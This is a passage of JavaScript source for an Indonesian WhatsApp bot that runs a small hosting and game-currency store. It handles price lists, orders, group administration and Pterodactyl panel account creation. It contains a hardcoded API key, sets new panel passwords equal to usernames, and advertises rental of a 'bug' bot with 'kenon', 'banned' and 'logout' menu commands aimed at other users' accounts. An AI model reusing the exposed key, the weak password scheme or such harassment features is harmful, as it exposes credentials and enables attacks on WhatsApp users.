let teks = `\`\`\`  CREATION GROUP MESSAGE  \`\`\`

 Name : ${cret.subject}
 Owner : @${cret.owner.split("@")[0]}
 Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
 Link : https://chat.whatsapp.com/${response}
`
setTimeout(() => {
m.Reply(teks) 
}, 7000)
setTimeout(() => {
DiansHost.groupParticipantsUpdate(cret.id, [m.sender], "promote")
}, 5000)
setTimeout(() => {
DiansHost.groupParticipantsUpdate(cret.id, [m.sender], "add")
}, 1000)
}
      
break
     
        break
	    case 'emojimix2': {
	    if (!text) throw `Example : ${prefix + command} `
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await DiansHost.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
        }
        break
//=================================================//
case 'listpc': {
if (!isCreator) return m.reply(`Hadeh`)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = ` *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += ` *Nama :* ${nama}\n *User :* @${i.split('@')[0]}\n *Chat :* https://wa.me/${i.split('@')[0]}\n\n\n\n`
 }
 DiansHost.sendTextWithMentions(from, teks, m)
}
        break
//=================================================//
case 'larangan': case 'peraturan': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
DiansHost.sendMessage(from, { text : `Haii  Aku Dians Hosting
Aku Sebagai Admin Akan Melarang Kalian Untuk Toxic Ataupun Berkata Kasar Di group Ini !!!

Larangan !!!
fuck
ajg
anjing
ngentod
bangsat
bgst` , mentions: participants.map(a => a.id)}, { quoted:m })
}
        break

//=================================================//
case 'assalamualaikum': case 'p': {
m.reply(`Waalaikumsalam`)
}
       break

//=================================================//
case 'bagaimanakah':
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
DiansHost.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted:m })
       break
case 'coffe': case 'kopi': {
if (!isCreator) return m.reply(mess.owner)
const ko = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: ` Random Coffe`
}
DiansHost.sendMessage(from, ko, { quoted:m })
}
     
    
break
        case 'ytmp3': case 'ytmp3':{
if (!text) return m.reply('Masukan Link Nya!!!')
m.reply(`Wet Banh`)
downloadMp3(text)
}
        break
//=================================================//
case 'ss': {
if (!isCreator) return m.reply('Khusus Ownerku')
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
DiansHost.sendMessage(from, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted:m }).catch((err) => m.reply(jsonformat('*LINK NYA SLUR*')))
}
        break
case 'qc':{ 
if (!isCreator) return m.reply('Khusus creator bot')
if (!quoted){
try {
var linkppuserp = await DiansHost.profilePictureUrl(mentionUser[0], 'image')
} catch {
var linkppuserp = 'https://telegra.ph/file/e323980848471ce8e2150.png'
}
const getname = await DiansHost.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
 {
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
 "url": linkppuserp
}
},
"text": quotedMsg.chats,
"replyMessage": {}
 }
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
var opt = { packname: "DiansHost", author: "DiansHost" }
DiansHost.sendImageAsSticker(from, buffer, m, opt)
});
} else if (q){
try {
var linkppuserp = await DiansHost.profilePictureUrl(sender, 'image')
} catch {
var linkppuserp = 'https://telegra.ph/file/e323980848471ce8e2150.png'
}
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
 {
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
 "url": linkppuserp
}
},
"text": q,
"replyMessage": {}
 }
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
var opt = { packname: "Im? Rizal", author: "DiansHost" }
DiansHost.sendImageAsSticker(from, buffer, m, opt)
});
} else {
m.reply(`Kirim perintah ${command} text atau reply pesan dengan perintah ${command}`)
}
}
        break
case 'win':
if (!isCreator) return m.reply('Khusus creator bot')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
let member = participants.map(u => u.id)
let pemenang = member[Math.floor(Math.random() * member.length)]
let menst = [pemenang]
asu = `Selamat Kepada Pemenang Giveway @${pemenang.split('@')[0]}`
DiansHost.sendMessage(from, {text : asu}, {quoted : m})
        break
      case 'group' : {
        if (!isCreator) return m.reply(`khusus owner`)
        if (!m.isGroup) return m.reply(`Di grup bang`)
        if (!isBotAdmins) return m.reply(`Bot bukan admin`)
        if (!isAdmins) return m.reply(`Khusus Admin grup`)
        if (text === 'close') {
          await DiansHost.groupSettingUpdate(m.chat, 'announcement').then ((res) => m.reply('Waduh Group Di Tutup, Mau Ngapain Min?')).catch ((err) => m.reply(jsonformat(err)))
        } else if (text === 'open') {
          await DiansHost.groupSettingUpdate(m.chat, 'not_announcement').then ((res) => m.reply('Akhirnya Di Buka Juga')).catch ((err) => m.reply(jsonformat(err)))
        } else {
          let buttons = [
            { buttonId: prefix + 'group open', buttonText: { displayText: 'Open' }, type: 1 },
            { buttonId: prefix + 'group close', buttonText: { displayText: 'Close' }, type: 1 },
          ]
          await DiansHost.sendButtonText(m.chat, buttons, 'Group Mode', packname, m)
        }
      }
        break
           case 'addgc':
    if (!isGroup) return m.reply(`Khusus DiansHost`)         
if (!isCreator) return m.reply(`khusus Creator`)
pler.push(m.chat)
fs.writeFileSync('./js/db/idgrup.json', JSON.stringify(pler))
m.reply('Sukses the group can create a domain')
        break
  case 'delgc':
    if (!isGroup) return m.reply(`Khusus DiansHostPedia`)
 if (!isCreator) return m.reply(`Khusus creator`)
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./js/db/idgrup.json', JSON.stringify(pler))
        m.reply('the group can no longer access the domain')
        break
case 'join':{
    if (!isCreator) return m.reply(`khusus creator bot`)
 if (!isCreator) return reply(mess.OnlyOwner)
if (!q) return reply(`Kirim perintah ${prefix+command} _linkgrup_`)
var ini_urrrl = q.split('https://chat.whatsapp.com/')[1]
var data = await DiansHost.groupAcceptInvite(ini_urrrl)
m.reply('*Sukses Join The Group..*')
}

        break
case 'runtime':
m.reply(`*Runtime :* ${runtime(process.uptime())}`)
        break
case 'google': {
if (!isCreator) return m.reply('Khusus creator bot')
                if (!text) throw `Example : ${prefix + command} Apa Arti Sebenarnya Dari Cinta`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += ` *Title* : ${g.title}\n`
                teks += ` *Description* : ${g.snippet}\n`
                teks += ` *Link* : ${g.link}\n\n\n\n`
                } 
                m.reply(teks)
                })
}
       
break
        break
//INI UNTUK FITUR STORE YA KAWAN//
case 'store':{
  // send a list message!
   const sections = [
    {
	title: "Store -1",
	rows: [
	   {
	    title: "Free Fire", 
	    rowId: `${prefix}ff`,
	    description: "List Harga Diamond Free Fire",
	   },	    
     ]
    },
    {
	title: "Store -2",
	rows: [
	   {
	    title: "Mobile Legends", 
	    rowId: `${prefix}ml`,
	    description: "List Harga Diamond Mobile Legends",
	   },	    
     ]
    },
    {
	title: "Store -3",
	rows: [
	   {
	    title: "Call Of Duty", 
	    rowId: `${prefix}cod`,
	    description: "List Harga CP Call Of Duty",
	   },	    
     ]
    },
    {
	title: "Store -4",
	rows: [
	   {
	    title: "PUBG MOBILE", 
	    rowId: `${prefix}pubg`,
	    description: "List Harga UC PUBG MOBILE",
	   },	    
     ]
    },
    {
	title: "Store -5",
	rows: [
	   {
	    title: "PANEL RUN BOT", 
	    rowId: `${prefix}buypanel`,
	    description: "List Harga Panel Run Bot",
	   },	    
     ]
    }     
    ]

  const listMessage = {
   text: `*_Welcome To Dians Hosting_*`,
   footer: "DiansHost",
   title: "",
   buttonText: "Silahkan Dipilih !!",
   sections
   }

  DiansHost.sendMessage(m.chat, listMessage, {quoted:m})
    


}
     
     
    
     break
case 'ml':
case 'mobilelegend':{
let teq =`  (  )
86 Rp19.500
172 Rp38.000
257 Rp56.600
344 Rp74.000
429 Rp93.400
514 Rp110.600
600 Rp138.000
706 Rp158.000
878 Rp197.000
963 Rp217.000
1050 Rp236.000
1220 Rp276.000
1412 Rp316.000
1669 Rp375.000
1926 Rp434.000
2195 Rp474.000
2539 Rp553.000
2901 Rp633.000
3073 Rp672.000
3688 Rp792.000
4032 Rp871.000
4394 Rp950.000
5100 Rp1.108.000
5532 Rp1.189.000
6238 Rp1.347.000
7727 Rp1.664.000
9288 Rp1.977.000

   : DiansHost

`
let btn_menu = [
{buttonId: `${prefix}pay`, buttonText: { displayText: '' }, type: 1 },
]
DiansHost.sendMessage(from,
{text: teq,
buttons: btn_menu},
{quoted: m })
}   
        break
case 'panel1':
case 'panel2':{
let teq =`   

1 GB 25% CPU. "2k"
2 GB 50% CPU "4k" 
3 GB 75% CPU "6k"
4 GB 100% CPU "8k"
5 GB 130% CPU "10k"
6 GB 155% CPU "12k"
7 GB 185% CPU "14k"
RAM UNLIMITED CPU UNLIMITED. "10k"
ADMIN PANEL "15k"


ON 24JAM
FAST RESPON
NO RIBET
BISA GANTI PW
HEMAT KOUTA
ADA HARGA ADA KUALITAS 
TAMPILAN PANEL KECE

*PROMO PANEL*
RAM/CPU UNLIMITED
HANYA DENGAN 10.000

BERMINAT CHAT
https://wa.me/62895328298685


`
let btn_menu = [
{buttonId: `${prefix}pay`, buttonText: { displayText: '' }, type: 1 },
]
DiansHost.sendMessage(from,
{text: teq,
buttons: btn_menu},
{quoted: m })
}
        break
case 'chips':
case 'chipsdomino':{
let teq =`
CHIPS DOMINO (  )
100M6.500
200M13.000
300M19.500
400M26.500
500M32.500
600M39.000
700M45.500
800M52.500
900M58.500


*Jika setuju untuk membeli*
Klik button di bawah!!`
let btn_menu = [
{buttonId: `${prefix}pay`, buttonText: { displayText: '' }, type: 1 },
]
DiansHost.sendMessage(from,
{text: teq,
buttons: btn_menu},
{quoted: m })
}
       
        break
case 'buypanel':{
if (!q) {
let sections = [{
title: "-- LIST HARGA PANEL --",
rows: [
{ title: 'RAM 1GB CPU 100%', rowId: prefix+'buypanel 1', description: 'Rp2.000/Bulan' },
{ title: 'RAM 2GB CPU 200%', rowId: prefix+'buypanel 2', description: 'Rp4.000/Bulan' },
{ title: 'RAM 3GB CPU 300%', rowId: prefix+'buypanel 3', description: 'Rp6.000/Bulan' },
{ title: 'RAM 4GB CPU 400%', rowId: prefix+'buypanel 4', description: 'Rp8.000/Bulan' },
{ title: 'RAM 5GB CPU 500%', rowId: prefix+'buypanel 5', description: 'Rp10.000/Bulan' },
{ title: 'RAM 6GB CPU 600%', rowId: prefix+'buypanel 6', description: 'Rp12.000/Bulan' },
{ title: 'RAM 7GB CPU 700%', rowId: prefix+'buypanel 7', description: 'Rp14.000/Bulan' },
{ title: 'RAM 8GB CPU 800%', rowId: prefix+'buypanel 8', description: 'Rp16.000/Bulan' },
{ title: 'RAM UNLIMITED CPU UNLIMITED', rowId: prefix+'buypanel 9', description: 'Rp20.000/Bulan' }
]
}]
let templateMessage = {
text: 'Berikut list harga panel\nYang kami sediakan.',
title: '*LIST HARGA PANEL*',
buttonText: 'DiansHost WHATSAP',
sections
}
DiansHost.sendMessage(from, templateMessage, { quoted: m })
}
if (/1/.test(q)) {
m.reply('Pesanan anda telah terkirim ke owner bot tunggu 1-10 menit nanti juga ada yang chat.')
DiansHost.sendMessage('62895328298685@s.whatsapp.net', { text: `*ADA YANG ORDER PANEL NIHH*\n\n*PAKET:* Rp2.000\n*RAM:* 1GB\n*CPU:* 100%\n*DARI:* @${sender.split('@')[0]}`, mentions: [sender]}, { quoted: m })
}
if (/2/.test(q)) {
m.reply('Pesanan anda telah terkirim ke owner bot tunggu 1-10 menit nanti juga ada yang chat.')
DiansHost.sendMessage('62895328298685@s.whatsapp.net', { text: `*ADA YANG ORDER PANEL NIHH*\n\n*PAKET:* Rp4.000\n*RAM:* 2GB\n*CPU:* 200%\n*DARI:* @${sender.split('@')[0]}`, mentions: [sender]}, { quoted: m })
}
if (/3/.test(q)) {
m.reply('Pesanan anda telah terkirim ke owner bot tunggu 1-10 menit nanti juga ada yang chat.')
DiansHost.sendMessage('62895328298685@s.whatsapp.net', { text: `*ADA YANG ORDER PANEL NIHH*\n\n*PAKET:* Rp6.000\n*RAM:* 3GB\n*CPU:* 300%\n*DARI:* @${sender.split('@')[0]}`, mentions: [sender]}, { quoted: m })
}
if (/4/.test(q)) {
m.reply('Pesanan anda telah terkirim ke owner bot tunggu 1-10 menit nanti juga ada yang chat.')
DiansHost.sendMessage('62895328298685@s.whatsapp.net', { text: `*ADA YANG ORDER PANEL NIHH*\n\n*PAKET:* Rp8.000\n*RAM:* 4GB\n*CPU:* 400%\n*DARI:* @${sender.split('@')[0]}`, mentions: [sender]}, { quoted: m })
}
if (/5/.test(q)) {
m.reply('Pesanan anda telah terkirim ke owner bot tunggu 1-10 menit nanti juga ada yang chat.')
DiansHost.sendMessage('62895328298685@s.whatsapp.net', { text: `*ADA YANG ORDER PANEL NIHH*\n\n*PAKET:* Rp10.000\n*RAM:* 5GB\n*CPU:* 500%\n*DARI:* @${sender.split('@')[0]}`, mentions: [sender]}, { quoted: m })
}
if (/6/.test(q)) {
m.reply('Pesanan anda telah terkirim ke owner bot tunggu 1-10 menit nanti juga ada yang chat.')
DiansHost.sendMessage('62895328298685@s.whatsapp.net', { text: `*ADA YANG ORDER PANEL NIHH*\n\n*PAKET:* Rp12.000\n*RAM:* 6GB\n*CPU:* 600%\n*DARI:* @${sender.split('@')[0]}`, mentions: [sender]}, { quoted: m })
}
if (/7/.test(q)) {
m.reply('Pesanan anda telah terkirim ke owner bot tunggu 1-10 menit nanti juga ada yang chat.')
DiansHost.sendMessage('62895328298685@s.whatsapp.net', { text: `*ADA YANG ORDER PANEL NIHH*\n\n*PAKET:* Rp14.000\n*RAM:* 7GB\n*CPU:* 700%\n*DARI:* @${sender.split('@')[0]}`, mentions: [sender]}, { quoted: m })
}
if (/8/.test(q)) {
m.reply('Pesanan anda telah terkirim ke owner bot tunggu 1-10 menit nanti juga ada yang chat.')
DiansHost.sendMessage('62895328298685@s.whatsapp.net', { text: `*ADA YANG ORDER PANEL NIHH*\n\n*PAKET:* Rp16.000\n*RAM:* 8GB\n*CPU:* 800%\n*DARI:* @${sender.split('@')[0]}`, mentions: [sender]}, { quoted: m })
}
if (/9/.test(q)) {
m.reply('Pesanan anda telah terkirim ke owner bot tunggu 1-10 menit nanti juga ada yang chat.')
DiansHost.sendMessage('62895328298685@s.whatsapp.net', { text: `*ADA YANG ORDER PANEL NIHH*\n\n*PAKET:* Rp20.000\n*RAM:* Unlimited\n*CPU:* Unlimited\n*DARI:* @${sender.split('@')[0]}`, mentions: [sender]}, { quoted: m })
}
}
        break
case "done?":{
if (!isCreator) return
bilangdone = `Jika Transaksi Selesai 
Silahkan Ketik Done & Kirim

Jika Malas Ketik Done Silahkan Click Tombol Dibawah Ini`
let btn_menu = [
{buttonId: `done`, buttonText: { displayText: 'Done Mas' }, type: 1 },
]
DiansHost.sendMessage(from,
{text: `${bilangdone}`,
buttons: btn_menu})
}
        break
case 'done':{
if (!isCreator && !fromMe) return m.reply('Ngapain..?')
let tek = (` *TRANSAKSI BERHASIL* \n\n\`\`\` TANGGAL : ${tanggal}\n JAM     : ${jam}\n STATUS  : Berhasil\`\`\`\n\nTerimakasih Telah order di *DiansHost*\nNext Order ya`)
m.reply(tek)
}
break
       break
case 'proses':{
let tek = (` *TRANSAKSI PENDING* \n\n\`\`\` TANGGAL : ${tanggal}\n JAM     : ${jam}\n STATUS  : Pending\`\`\`\n\n*--------------------------*\n\n*Pesanan ini akan diproses manual oleh admin,* *Tunggu admin memprosesnya*\n*Atau Chat : Wa.me//${'62895328298685'}*`)
        m.reply(tek)
}
break
       
        break
case 'donasi': case 'donate': case 'donasi': case 'donasi': {
                DiansHost.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/550d90f649c350777966f.jpg' }, caption: `*Hi Bro ${m.pushName}*\n*_Jika ingin Donasi Silahkan Scan Gambar Diatas Dan kirim bukti tf ke nomer 62895328298685_*

*_Atau Via_*
- Dana : tf atas aja
- Gopay : tf atas aja
- Qris : -


*_Terima Kasih Bagi Yang Sudah Donasi_*\n` }, { quoted: m })
}
        break 
    case 'ahay2':
        m.reply(`ok`)
        break
    case 'apauy':
        m.reply(`ok`)
        break
case 'block':{
if (!isCreator && !fromMe) return reply(mess.OnlyOwner)
if (!q) return m.reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Block\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await DiansHost.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "block") // Block user
m.reply('Sukses Block Nomor')
}
        break
case 'unblock':{
if (!isCreator && !fromMe) return reply(mess.OnlyOwner)
if (!q) return m.reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Unblock\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await DiansHost.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "unblock")
m.reply('Sukses Unblock Nomor')
}
        break
case 'pay':
case 'payment':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
let tampilan_nya = `*SILAHKAN PILIH METODE*
*PEMBAYARAN ANDA*`
DiansHost.sendMessage(from,
{text: tampilan_nya,
buttonText: " DiansHost",
sections: [{title: "[  ]",
rows: [
{title: " DANA", rowId: prefix+"dana", description: ""},
{title: " QRIS", rowId: prefix+"qr", description: ""}]},
],
footer: 'https://youtube.com/@DiansHost',
mentions:[global.author, sender]})
}
        break
case 'listscripit':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
let tampilan_nya = `*BERIKUT ADALAH SCRIPT BOT*
*YANG DI JUAL OLEH Dians Hosting*`
DiansHost.sendMessage(from,
{text: tampilan_nya,
buttonText: "  BY Dians HostingStore",
sections: [{title: "  DiansHost",
rows: [
{title: "   ", rowId: prefix+"pay", description: " ."},
{title: "    &  ", rowId: prefix+"pay", description: " ."},
{title: "    ", rowId: prefix+"pay", description: " ."},
{title: "   ", rowId: prefix+"pay", description: " ."},
{title: "   & ", rowId: prefix+"pay", description: " ."},
{title: "   ", rowId: prefix+"pay", description: " ."},
{title: "    ", rowId: prefix+"pay", description: " ."},
{title: "    ", rowId: prefix+"pay", description: " ."},
{title: "      ", rowId: prefix+"pay", description: " ."},
{title: "   +   ", rowId: prefix+"pay", description: " ."},
{title: "    +  + ", rowId: prefix+"pay", description: " ."}]},
],
footer: 'DiansHost',
mentions:[global.author, sender]})
}
        break
case 'listsewa':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
let tampilan_nya = `List Sewa Bot Bug Rizal
Keuntungan?
- Bebas Spam
- Bawa Bot Ke Gc mu [ Maxsimal 1 Grup ]
- anti jeda 5 menit
- Bot On 24 Jam & No Delay

Untuk Fitur Bug Nya Silahkan Cek Di Nomor Bot Wa.me/62895328298685

   & 
   *_DiansHost_*
`
DiansHost.sendMessage(from,
{text: tampilan_nya,
buttonText: " & ",
sections: [{title: "  DiansHost",
rows: [
{title: " 1 MINGGU", rowId: prefix+"pay", description: "Rp 15.000"},
{title: " 1 BULAN", rowId: prefix+"pay", description: "Rp 25.000"},
{title: " 2 BULAN", rowId: prefix+"pay", description: "Rp 35.000"},
{title: " 3 BULAN", rowId: prefix+"pay", description: "Rp 45.000"},
{title: " PERMANEN", rowId: prefix+"pay", description: "Rp 55.000"}]},
],
footer: 'DiansHost',
mentions:[global.author, sender]})
}
  break
case 'instalsrvl':
case 'listinstalsrv':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
let tampilan_nya = `Keuntungan Jadi Admin Pannel?

- Bisa Create Pannel & Di Jual
- Bisa Jadi Kang Jasa Runn Bot on 24 Jam
- Bisa Jadi Kang Jasa Buat Bot 
- Di Jamin Balik Modal



*FREE EGG*
*FREE SC CREATE PANNEL*
*VPS DARI SAYA*
*DOMAIN DARI SAYA*
*INTINYA TINGGAL PAKE SAJA*

GARANSI 15 HARI


   &  
*_JASA INSTALL SERVER PANEL_* `
DiansHost.sendMessage(from,
{text: tampilan_nya,
buttonText: "LIST & HARGA",
sections: [{title: "LIST & HARGA PEMBUATAN ADMIN PANNEL",
rows: [
{title: " 20 GB", rowId: prefix+"pay", description: "RP 30.000 / BULAN"},
{title: " 40 GB", rowId: prefix+"pay", description: "RP 50.000 / BULAN"},
{title: " 80 GB", rowId: prefix+"pay", description: "RP 100.000 / BULAN"}]},
],
footer: 'DiansHost',
mentions:[global.author, sender]})
}
       break
case 'self': {
if (!isCreator) return m.reply('Khusus creator bot')
DiansHost.public = false
m.reply('Sukses Change To Self')
} 
       break
case 'public': {
if (!isCreator) return m.reply('Khusus creator bot')
DiansHost.public = true
m.reply('Sukse Change To Public')
} 
        break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
               if (!isCreator) return m.reply('khusus creator bot')
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await DiansHost.downloadAndSaveMediaMessage(m)
                await DiansHost.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply('done')
           }
        break
case 'thanksto':
	DiansHost.sendMessage(from, {text: `* THANKS TO *
   Allah Swt
   Ortu
   Akmal Mods
   DiansHost *[Creator]*`},
{quoted: m})
break
case 'panelmenu':
        m.reply(`proses`)
        DiansHost.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/86a66c629f5747bebd5aa.jpg' }, caption:`
      *PTERODACTYL*    

       
    addusr
    addusr2
    addusr_ram
    crateadmin
    detusr
    detsrv
    delusr
    delsrv
    webpanel
    ramlist
    listusr 
    listsrv
    addsrv
` }, { quoted: m })
break
case 'ownermenu': 
        m.reply(`proses`)
DiansHost.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/86a66c629f5747bebd5aa.jpg' }, caption: `
      *OWNER MENU*    

       
    infopanel
    setppbot
    pushkontak
    daftar
    restseler
    listseler
    del @/62xx
    add  @/62xx 
    addgc
    delgc
   owner
` }, { quoted: m })
break
case 'groupmenu':
        m.reply(`proses`)
        DiansHost.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/86a66c629f5747bebd5aa.jpg' }, caption:`
      *GROUP MENU*    

       
    kick
    hidetag
    DiansHostrl
    sendgc
    lgc
    antilink on/off
    promote
    demote
    grup open\close
    setppgrup
    id
    tagall
    listgc
   setnama
   setdesc
   welcome on/off
` }, { quoted: m })



break
case 'scripit':
m.reply(` UNTUK SCRIPIT CRATE PANEL KLIAN BISA MEMBELINYA DENGAN HARGA 30K .MINAT? wa.me/62895328298685`)
break
case 'paymentmenu':
m.reply(` *PAYMNET MENU*
 
 .dana
 .qris
`)
        break
case 'mainmenu':
        m.reply(`proses`)
        DiansHost.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/86a66c629f5747bebd5aa.jpg' }, caption: ` 
      *MAIN MENU*    

       
    ramaljodoh
    sewa
    lapor
    emojimix
    google
    confes
    win
    seticker/s
    apakah <text>
    couple
    pin
    bagaimanakah <text>
    kopi/coffe 
` }, { quoted: m })
break
case 'storemenu':
        m.reply(`process don't spam bot`)
        DiansHost.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/86a66c629f5747bebd5aa.jpg' }, caption: ` 
      *STORE MENU*    

       
    store
    done
    list
   delist
   addlist
` }, { quoted: m })
        break
case 'bugverify':
        m.reply(`loading`)
        DiansHost.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/86a66c629f5747bebd5aa.jpg' }, caption: ` 
      *VERIFY MENU*    

       
    kenon
    banned
    verify
    logout
` }, { quoted: m })
break
case 'anime':
        m.reply(`proses`)
        DiansHost.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/86a66c629f5747bebd5aa.jpg' }, caption:`
      *ANIMEH*    

       
    waifu
    loli
    husbu
    coplay
    wllml
` }, { quoted: m })

 
        break

        case "addusr3": {
    if (!isSeler) return m.reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1-0gb"
let egg = global.eggsnya
let loc = global.location
let memo = "1-0"
let cpu = "1-0"
let disk = "1-0"
let email = username + "1398@blaze.hosting"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await DiansHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}
Ini Adalah Data Akun Mu
JANGAN LUPA GANTI PASSWORD ACCOUNT

TUTORIAL GANTI PASSWORD AKUN : https://bit.ly/3ZBkHV6

[USER ID: ${user.id}]
USERNAME: ${user.username}
PASSWORD: ${password}
LOGIN: ${domain}

TUTORIAL PAKAI PANEL SILAHKAN CEK
https://bit.ly/3ZRFHHB
`
DiansHost.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DiansHost.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 1-0? '1-0' : server.global.memory} MB
DISK: ${server.limits.disk === 1-0 ? 'global' : server.global.disk} MB
CPU: ${server.limits.cpu}%

`)

}
 

     
        break
case 'pin': {
if (!isCreator) return m.reply('Khusus creator bot')
 m.reply('Bentar')
 let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                DiansHost.sendMessage(m.chat, { image: { url: result }, caption: ' Media Url : '+result }, { quoted: m })
}
        break

case 'lgc': case 'linkgc': {

if (!isCreator) return m.reply('Khusus creator bot')

if (!m.isGroup) return m.reply('Buat Di Group Bodoh')

if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')

let response = await DiansHost.groupInviteCode(from)

DiansHost.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
        //depo
                case 'depo':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
let tampilan_nya = `*SILAHKAN PILIH METHODE DEPOSIT*
*PEMBAYARAN ANDA*`
DiansHost.sendMessage(from,
{text: tampilan_nya,
buttonText: "PAYMENT",
sections: [{title: "Payment DiansHost",
rows: [
